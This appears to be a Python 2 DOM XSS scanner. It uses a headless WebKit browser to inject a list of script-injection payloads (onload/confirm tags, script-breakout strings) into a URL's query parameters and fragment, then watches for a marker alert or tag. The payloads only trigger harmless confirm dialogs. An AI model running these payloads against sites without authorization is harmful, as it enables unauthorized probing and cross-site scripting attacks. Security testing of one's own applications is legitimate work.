#!/usr/bin/env python
# coding=utf-8
# coded by qinghs4n

import sys
import time
import BeautifulSoup
import urlparse
import urllib
from termcolor import colored
from optparse import OptionParser

try:
    from PySide.QtCore import QUrl
    from PySide.QtGui import QApplication
    from PySide.QtWebKit import QWebPage
    from PySide.QtNetwork import QNetworkAccessManager, QNetworkRequest
except:
    from PyQt4.QtCore import QUrl
    from PyQt4.QtGui import QApplication
    from PyQt4.QtWebKit import QWebPage
    from PyQt4.QtNetwork import QNetworkAccessManager, QNetworkRequest

class MyBrowser:
    global result
    global DEBUG
    global DOMXSSTAG
    global XSSSIGN

    def __init__(self):

        self.debug = DEBUG
        self.xsssign = XSSSIGN
        self.tagsign = DOMXSSTAG
        #一些全局的东西
        self.headers = {'User-Agent' : 'Mozilla/5.0 (MSIE 9.0; Windows NT 6.1; Trident/5.0)'}
        self.timeout = 3
        #记录respones的数据
        self._load_status = None
        self.http_code = None
        #初始化webkit
        self.application = QApplication([])

    def load_url(self, url='', method='get', body='', headers={}):
        self.webpage = QWebPage()
        self.webframe = self.webpage.currentFrame()
        #document = self.webframe.documentElement().tagName()
        #print '--------------'
        #print self.webframe.documentElement().findFirstElement('script').tagName ()
        #重写alert confirm事件
        self.webpage.javaScriptAlert = self._on_javascript_alert
        self.webpage.javaScriptConfirm = self._on_javascript_confirm
        self.webpage.javaScriptConsoleMessage = self._on_javascript_consolemessage
        self.netmanager = self.webpage.networkAccessManager()
        #绑定事件
        self.netmanager.finished.connect(self._request_ended)
        self.webpage.loadFinished.connect(self._on_load_finished)
        self.webpage.loadStarted.connect(self._on_load_started)

        try:
            method = getattr(QNetworkAccessManager, "%sOperation" % method.capitalize())
        except AttributeError, e:
            if self.debug:
                my_print("[-] Error: %s" % str(e), 'yellow')

        request = QNetworkRequest(QUrl(url))
        if headers == {}:
            headers = self.headers
        for header in headers:
            request.setRawHeader(header, headers[header])

        self.webframe.load(request, method, body)
        self.wait_for()
        #self.check_tag(self.tagsign)

    def _on_load_started(self):
        self._load_status = 'start'
        if self.debug:
            my_print("[+] Page load started", 'green')

    def _on_load_finished(self, successful):
        if successful:
            self._load_status = successful
        if self.debug:
            my_print("[+] Page load finished", 'green')

    def wait_for(self, timeout = 5):
        start = time.time()
        if timeout:
            timeout = self.timeout

        while(self._load_status == 'start' and time.time() - start < timeout):
            self.application.processEvents()

    def get_html(self):
        return unicode(self.webframe.toHtml())

#    def check_tag(self, tagsign=''):
#        global ISXSS
#        if tagsign == '':
#            tagsign = self.tagsign
#        html = self.get_html()
#        if html:
#            soup = BeautifulSoup.BeautifulSoup(html)
#
#            if soup.find(tagsign):
#                ISXSS = True
#                my_print('[*] Find tagsign, it\'s a dom xss!')
#                return True
#        else:
#            return False

    def _request_ended(self, reply):
        if self.debug:
            my_print('[+] request finished', 'green')
        self.http_code = reply.attribute(QNetworkRequest.HttpStatusCodeAttribute)

    def _on_javascript_alert(self, webframe, message):
        global ISXSS
        if message == self.xsssign:
            ISXSS = True
            my_print('[*] Find xsssign, is\'s a dom xss! URL: %s' % webframe.url().toString())

    def _on_javascript_confirm(self, webframe, message):
        global ISXSS
        if message == self.xsssign:
            ISXSS = True
            my_print('[*] Find xsssign, is\'s a dom xss! URL: %s' % webframe.url().toString())
        return True

    def _on_javascript_consolemessage(self, message, linenumber, sourceid):
        my_print("[-] Javascript console (%s:%d): %s" % (sourceid, linenumber, message), 'yellow')

    def close(self):

        try:
            if self.netmanager:
                del self.netmanager
            if self.webframe:
                del self.webframe
            if self.webpage:
                del self.webpage
        except Exception, e:
            my_print("[-] Error %s" % str(e), 'yellow')
        try:
            self.application.quit()
        except Exception, e:
            my_print("[-] Error %s" % str(e), 'yellow')

def my_print(outstring, color='red'):
    print colored(outstring, color)


if __name__ == '__main__':
    '''
    全局变量
    '''
    DOMXSSTAG = 'domxss'
    XSSSIGN = '7758'
    result = []
    ISXSS = False
    '''
    解析参数
    '''
    try:
        xssusage = 'usage: %prog -u url -d debuglev'
        parser = OptionParser(xssusage)
        parser.add_option("-u", "--url", dest="url",
            help="url to check dom xss")
        parser.add_option("-d", "--debug", dest="debug",
            help="debug level")
        (options,args)=parser.parse_args()
        url = options.url
        DEBUG = int(options.debug)
    except:
        parser.print_help()
        sys.exit()

    payloads = ['"/>"><body/onload=confirm(7758)>','<domxss>7758</domxss>', 'confirm(7758)','>\'>\"><script>window.a==1?1:confirm(a=7758)</script>','--></script><script>window.a==1?1:confirm(a=7758)</script>','\';confirm(7758);\'','</script><script>confirm(7758);//','alert(7758)']
    browser = MyBrowser()

    scheme, netloc, path, params, query, fragment = urlparse.urlparse(url)

    if query != '':
        tmp_params = urlparse.parse_qs(query) # {'name': ['value']}
        #print tmp_params

        for key in tmp_params:
            tmp_params[key] = tmp_params[key][0] # {'name': 'value'}
        #print tmp_params

        for key in tmp_params:
            if ISXSS:
                break

            for payload in payloads:
                if ISXSS:
                    break

                value = tmp_params[key]
                tmp_params[key] = payload
                xssurl = urlparse.urlunparse([scheme, netloc, path, params, urllib.unquote(urllib.urlencode(tmp_params)), fragment])
                if DEBUG:
                    my_print('[+] Request URL: %s' % xssurl, 'green')
                try:

                    browser.load_url(xssurl)
                    html = browser.get_html()
                    #print html

                    if html != '' and DOMXSSTAG in xssurl:
                        if DEBUG:
                            print "[+] Response is not empty, now checking somethings!"

                        soup = BeautifulSoup.BeautifulSoup(html)

                        if soup.find(DOMXSSTAG):
                            ISXSS = True
                            my_print("[*] Finded Dom Tag, It's Dom Xss! URL: %s" % xssurl)

                except Exception, e:
                    #browser.close()
                    if DEBUG:
                        my_print("[-] Error: %s" % str(e), 'yellow')

    '''
    如果有flag那么要测试flag
    '''
    if fragment != '':
        #if isxss == True:
        for payload in payloads:
            if ISXSS ==True:
                break

            xssurl = urlparse.urlunparse([scheme, netloc, path, params, query, payload])
            if DEBUG:
                my_print('[+] Request URL %s' % xssurl, 'green')

            try:
                browser.load_url(xssurl)
                html = browser.get_html()

                if html != '' and DOMXSSTAG in xssurl:
                    if DEBUG:
                        my_print("[+] Response is not empty, now checking somethings!", 'green')

                    soup = BeautifulSoup.BeautifulSoup(html)

                    if soup.find('domxss'):
                        ISXSS = True
                        my_print("[*] Finded Dom Tag <domxss>...It's Dom Xss!")

            except Exception, e:
                if DEBUG:
                    my_print("[-] Error: %s" % str(e), 'yellow')

    browser.close()
